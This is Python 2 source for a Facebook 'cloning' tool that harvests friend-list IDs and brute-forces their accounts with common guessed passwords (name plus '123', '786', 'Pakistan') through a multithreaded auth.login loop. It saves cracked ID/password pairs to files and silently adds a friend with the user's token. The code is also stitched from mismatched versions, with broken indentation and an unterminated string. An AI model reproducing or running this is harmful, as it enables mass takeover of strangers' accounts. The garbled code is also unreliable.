        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m8 .\033[1;95mî‚  Start Cloning Pakistan Old   "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m9 .\033[1;95mî‚  Start Cloning BlackMafia     "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m10.\033[1;95mî‚  Start Cloning Testing        "
        time.sleep(0.05)
        print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;93m> \033[1;93m11.\x1b[1;95mî‚  Start Cloning Group uncomplet"
        time.sleep(0.05)
	print "\033[1;93m-â€¢â—ˆâ€¢-\033[1;91m> \033[1;91m0 .\033[1;91mî‚  Back"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;95mÂ«-----------------\033[1;91mBlackMafia\033[1;95m---------------Â»"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			crack()
		print"\033[1;93mGetting IDs\033[1;93m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
        elif peak =="2":
	        super()
        elif peak =="3":
	        hack()
        elif peak =="4":
	        black()
        elif peak =="5":
	        mafia()
        elif peak =="6":
	        test()
        elif peak =="7":
	        phone()
        elif peak =="8":
	        mail()
        elif peak =="9":
	        isi()
        elif peak =="10":
	        army()
        elif peak =="11":
                clone_dari_member_group ()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97mÂ«-----\x1b[1;91mã€To Stop Process Press CTRL+Zã€‘\033[1;97m----Â»"
	print "\033[1;97mÂ«--------------------\033[1;92mâ–£\033[1;97m------------------Â»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Pakistan ')
	print "\033[1;97mÂ«--------------------\033[1;92mâ–£\033[1;97m------------------Â»"
	
			
	def main(arg):
		global cekpoint,sucessful
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Dev:love_hacker
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92mâ–£\x1b[1;97m-' + user + '-\x1b[1;92mâ–£\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91mâ–£\x1b[1;97m-' + user + '-\x1b[1;91mâ–£\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92mâ–£\x1b[1;97m-' + user + '-\x1b[1;92mâ–£\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91mâ–£\x1b[1;97m-' + user + '-\x1b[1;91mâ–£\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92mâ–£\x1b[1;97m-' + user + '-\x1b[1;92mâ–£\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91mâ–£\x1b[1;97m-' + user + '-\x1b[1;91mâ–£\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92mâ–£\x1b[1;97m-' + user + '-\x1b[1;92mâ–£\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91mâ–£\x1b[1;97m-' + user + '-\x1b[1;91mâ–£\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92mâ–£\x1b[1;97m-' + user + '-\x1b[1;92mâ–£\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91mâ–£\x1b[1;97m-' + user + '-\x1b[1;91mâ–£\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['first_name'] + y['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92mâ–£\x1b[1;97m-' + user + '-\x1b[1;92mâ–£\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91mâ–£\x1b[1;97m-' + user + '-\x1b[1;91mâ–£\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92mâ–£\x1b[1;97m-' + user + '-\x1b[1;92mâ–£\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91mâ–£\x1b[1;97m-' + user + '-\x1b[1;91mâ–£\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95mâ€¢â—ˆâ€¢â–¬Â â–¬Â â–¬Â â–¬Â â–¬Â â–¬Â â–¬â€¢â—ˆâ€¢\033[1;91mBlackMafia\033[1;95mâ€¢â—ˆâ€¢â–¬Â â–¬Â â–¬Â â–¬Â â–¬Â â–¬Â â–¬â€¢â—ˆâ€¢"
	print "  \033[1;91mÂ«---â€¢â—ˆâ€¢---Developed By love-Hacker--â€¢â—ˆâ€¢---Â»" #Dev:love_hacker
	print '\033[1;95mProcess Has Been Completed Pressâž¡ Type 0 Enterâ†© Next Type 0 (Back)â†©\033[1;97m....'
        print '\033[1;95mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;92m"+str(len(oks))+"\033[1;95m/\033[1;91m"+str(len(cekpoint))
	print """
 ____________Â¶Â¶Â¶1Â¶Â¶_________Â¶Â¶Â¶Â¶Â¶Â¶Â¶___________ 
_________Â¶Â¶Â¶111Â¶Â¶___________Â¶Â¶111Â¶Â¶Â¶Â¶________ 
______Â¶Â¶Â¶Â¶1111Â¶Â¶Â¶____________Â¶Â¶Â¶1111Â¶Â¶Â¶1_____ 
_____Â¶Â¶Â¶1111Â¶Â¶Â¶Â¶_____________Â¶Â¶Â¶Â¶11111Â¶Â¶Â¶____ 
___Â¶Â¶Â¶11Â¶1Â¶1Â¶Â¶Â¶Â¶___Â¶Â¶____Â¶Â¶__Â¶Â¶Â¶Â¶Â¶1Â¶1Â¶1Â¶Â¶Â¶1__ 
__Â¶Â¶Â¶11Â¶1Â¶11Â¶Â¶Â¶Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶Â¶Â¶Â¶1Â¶1Â¶Â¶11Â¶Â¶1_ 
_Â¶Â¶Â¶11Â¶Â¶1Â¶11Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶_Â¶Â¶Â¶Â¶Â¶Â¶Â¶1Â¶Â¶1Â¶Â¶1Â¶Â¶Â¶_ 
Â¶Â¶Â¶Â¶1Â¶Â¶11Â¶Â¶1Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶1Â¶Â¶1Â¶Â¶Â¶1Â¶Â¶Â¶ 
Â¶Â¶Â¶11Â¶Â¶11Â¶Â¶1Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶1Â¶Â¶Â¶1Â¶Â¶Â¶1Â¶Â¶Â¶ 
Â¶Â¶Â¶1Â¶Â¶Â¶Â¶1Â¶Â¶Â¶1Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶11Â¶Â¶Â¶1Â¶Â¶Â¶11Â¶Â¶ 
_Â¶Â¶11Â¶Â¶Â¶1Â¶Â¶Â¶Â¶1Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶1Â¶Â¶Â¶1Â¶Â¶Â¶Â¶1Â¶Â¶Â¶ 
_Â¶Â¶Â¶1Â¶Â¶Â¶Â¶1Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶1Â¶Â¶Â¶Â¶1Â¶Â¶1 
__Â¶Â¶1Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶1Â¶Â¶Â¶_ 
___Â¶Â¶1Â¶Â¶Â¶_Â¶Â¶_______Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶______Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__ 
____Â¶Â¶Â¶Â¶____________Â¶Â¶Â¶Â¶Â¶Â¶___________Â¶Â¶Â¶Â¶____ 
______Â¶Â¶Â¶__________Â¶Â¶Â¶__Â¶Â¶Â¶__________Â¶Â¶______ 
_______Â¶Â¶Â¶_________Â¶______Â¶_________Â¶Â¶Â¶______
 
 Don't Worry Your Error ID Will Be Open After 7 Days 


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print """
\033[1;32m╔════•ೋೋ•ೋೋ•════╗ 
\033[1;96m   •••S-A•••
\033[1;32m╚════•ೋೋ•ೋೋ•════╝"""
 
jalan('\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰')

jalan('\033[1;97mLoading•••ANMOL x SOMI') 
jalan('\033[1;97m▒▒▒▒▒▒▒▒▒▒')
print"\033[1;32m0%"
jalan('\033[1;97m█▒▒▒▒▒▒▒▒▒')
print"\033[1;32m10%"
jalan('\033[1;97m███▒▒▒▒▒▒▒')
print"\033[1;32m30%"
jalan('\033[1;97m█████▒▒▒▒▒')
print"\033[1;32m50%"
jalan('\033[1;97m███████▒▒')
print"\033[1;32m80%"
jalan('\033[1;97m█████████')
print"\033[1;32m100%"
jalan('\033[1;31m COMPLETING•••')
jalan('\033[1;22m DONE•••PLEASE WAIT')
jalan('\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰')

jalan('\033[1;34mTHE OFFICIAL HACKER SOMI-TRICKER') 
jalan('\033[1;91mTHIS TOOL IS OWNER ANMOL-TRICKER') 
jalan('\033[1;31mSO GUYS YOU FOLLOWS OUR THIS TOOL') 
jalan('\033[1;31mIF YOU HAVE ANY PROBLEM YOU CANTACT IN MY FACEBOOK') 
jalan('\033[1;31mTHIS TOOL IS ONLY EDUCATION PROMOTE') 
jalan('\033[1;31mSO LETS START HACKING')  

jalan('\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰')

jalan('\033[1;35m▁▁▁▁▁▁▁▁▓♤▓')
jalan('\033[1;35m▁▁▁▁▁▁▁▓♤▓')
jalan('\033[1;35m▁▁▁▁▁▁▓♤▓▁▁▁▁█')
jalan('\033[1;35m▁▁▁▁▓♤▓▓▁▁▁▁███')
jalan('\033[1;35m▁▁▁▓♤▓▁▁▁▁▁██▓██')
jalan('\033[1;35m▁▁▓♤▓▁▁▁▁▁██▓█▓██')
jalan('\033[1;35m▁▓♤▓▁▁▁▁▁█▓▓█▓█▓▓█')
jalan('\033[1;35m▁▓♤▓▁▁▁▁█▓▓█▓▓▓█▓▓█')
jalan('\033[1;35m▁▁▓♤▓▁▁▁█▓▓▓█▓█▓▓▓█')
jalan('\033[1;35m▁▁▁▓♤▓▁▁▁██▓▓█▓▓██')
jalan('\033[1;35m▁▁▁▁▓♤▓▁▁▁██▓▓▓██')
jalan('\033[1;35m▁▁▁▁▁▓♤▓▁▁▁▁███-')
jalan('\033[1;35m▁▁▁▁▁▁▓♤▓▁▁▁▓♤▓-')
jalan('\033[1;35m▁▁▁▁▁▁▁▓♤▓▁▓♤▓-')
jalan('\033[1;35m▁▁▁▁▁▁▁▁▓♤▓♤▓-')
jalan('\033[1;35m▁▁▁▁▁▁▁▁▁▓♤▓-')
jalan('\033[1;35m▁▁▁▁▁▁▁▁▓♤▓')
jalan('\033[1;35m▁▁▁▁▁▁▁▓♤▓')
jalan('\033[1;35m▁▁▁▁▁▁▓♤▓▁▁▁▁█')
jalan('\033[1;35m▁▁▁▁▓♤▓▓▁▁▁▁███')
jalan('\033[1;35m▁▁▁▓♤▓▁▁▁▁▁██▓██')
jalan('\033[1;35m▁▁▓♤▓▁▁▁▁▁██▓█▓██')
jalan('\033[1;35m▁▓♤▓▁▁▁▁▁█▓▓█▓█▓▓█')
jalan('\033[1;35m▁▓♤▓▁▁▁▁█▓▓█▓▓▓█▓▓█')
jalan('\033[1;35m▁▁▓♤▓▁▁▁█▓▓▓█▓█▓▓▓█')
jalan('\033[1;35m▁▁▁▓♤▓▁▁▁██▓▓█▓▓██')
jalan('\033[1;35m▁▁▁▁▓♤▓▁▁▁██▓▓▓██')
jalan('\033[1;35m▁▁▁▁▁▓♤▓▁▁▁▁███-')
jalan('\033[1;35m▁▁▁▁▁▁▓♤▓▁▁▁▓♤▓-')
jalan('\033[1;35m▁▁▁▁▁▁▁▓♤▓▁▓♤▓-')
jalan('\033[1;35m▁▁▁▁▁▁▁▁▓♤▓♤▓-')
jalan('\033[1;35m▁▁▁▁▁▁▁▁▁▓♤▓-')
jalan('\033[1;32m⊱• ──────────── S–A–A–L ──────────── •⊰')

jalan('\033[1;34m⊱• ──────────── TOOL LOGIN ──────────── •⊰')

CorrectUsername = "Somi"
CorrectPassword = "ANMOL"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;33mTool Username \x1b[1;31mᐵ \x1b[1;32m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;33mTool Password \x1b[1;31mᐵ \x1b[1;32m")
        if (password == CorrectPassword):
            print "\033[1;32mACCESS GRANTED AS " + username #Dev:SOMI-TRICKER
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;31mACCESS DENIED"
            os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
    else:
        print "\033[1;31mACCESS DENIED"
        os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
     	
		
		jalan(' \033[1;31m༻ \033[1;93mWarning: \033[1;96mUse a New Account To Login' )
		jalan(' \033[1;31m༻ \033[1;93mWarning: \033[1;31mDONOT USE YOUR PERSONAL ACCOUNT' ) 
		
		
		print('      \033[1;96m--->•••LOGIN WITH FACEBOOK•••<----')
		print('	' )
		id = raw_input('\033[1;96m[] \x1b[1;94mID/Email\x1b[1;32m: \x1b[1;32m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;94mPassword\x1b[1;32m: \x1b[1;32m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;96m•••••༻Login Successful༻•••••'
				os.system('xdg-open https://www.youtubeHttps://youtu.be/bjCzrgzq9yM')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;31mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;31mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;94mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Somi
	print logo
	print "  \033[1;32m⚡\033[1;96m      Logged in User Info\033[1;32m⚡"
	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
	print "\033[1;93mSOMI-TRICKER THE OFFICIAL PROGRAMMER[ S°A°A]"
	
	print "\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰"
		
	print "\033[1;38m≫ \033[1;32m1.\x1b[1;96mStart Cloning•••"
	print "\033[1;38m≫ \033[1;32m0.\033[1;96mLogout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;96mInput Your Choice>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;32m≫\033[1;32m1.\x1b[1;96mClone From Friend List."
	print "\033[1;32m≫\033[1;32m2.\x1b[1;96mClone Friend List Public ID."
	print "\033[1;32m≫\033[1;31m0.\033[1;97mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;96mInput Your Choice>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;32m Please Wait"
		jalan('\033[1;94mGetting IDs \033[1;94m•••••')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;32m〄\033[1;94mInput PublIc Id Username\033[1;33m: \033[1;97m")
		print """\033[1;32m⊱• ───────── S-A-TRICKER THE OFFICIAL PROGRAMMER[ X.P.T] ───────── •⊰"""

		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;96m "+op["name"]
		except KeyError:
			print"\x1b[1;31mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;93mBack\033[1;97m]")
			super()
		print"\033[1;94mGetting IDs\033[1;97mPlease Be Patience..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m•••••')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;94mCloning Is In Progress\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print """
\033[1;32m⊱• ───────── Somi Anmol THE OFFICIAL PROGRAMMER───────── •⊰
\033[1;92m⊱• ─────────SUPPORT LIKE SUBCRIBE SHERE IN 3 GROUPS ||√ SO DON'T COPY OVER SCRIPT  ───────── •⊰


░█████╗░███╗░░██╗███╗░░░███╗░█████╗░██╗░░░░░
██╔══██╗████╗░██║████╗░████║██╔══██╗██║░░░░░
███████║██╔██╗██║██╔████╔██║██║░░██║██║░░░░░
██╔══██║██║╚████║██║╚██╔╝██║██║░░██║██║░░░░░
██║░░██║██║░╚███║██║░╚═╝░██║╚█████╔╝███████╗
╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░░░░╚═╝░╚════╝░╚══════╝"""
	
	
	jalan('\033[1;97m•••••••••••\033[1;93mCloning Start..\033[1;97m•••••••••• ')
     
	
	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '786'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['first_name']+'12345'										
